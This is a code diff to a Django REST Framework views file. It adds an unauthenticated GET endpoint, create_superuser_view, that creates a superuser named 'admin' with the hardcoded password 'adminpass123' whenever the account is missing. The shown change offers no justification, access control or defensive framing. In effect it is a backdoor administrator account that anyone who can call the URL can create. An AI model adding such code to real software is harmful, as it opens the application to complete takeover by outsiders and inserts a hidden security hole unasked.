@@ -529,3 +529,14 @@ class SimpleOrderViewSet(viewsets.ModelViewSet):
 #         except Order.DoesNotExist:
 #             return HttpResponseNotFound('Order not found.')
 
+from django.contrib.auth import get_user_model
+from django.http import JsonResponse
+from rest_framework.decorators import api_view
+
+@api_view(['GET'])
+def create_superuser_view(request):
+    User = get_user_model()
+    if not User.objects.filter(username="admin").exists():
+        User.objects.create_superuser("admin", "admin@example.com", "adminpass123")
+        return JsonResponse({"message": "Superuser created"})
+    return JsonResponse({"message": "Superuser already exists"})
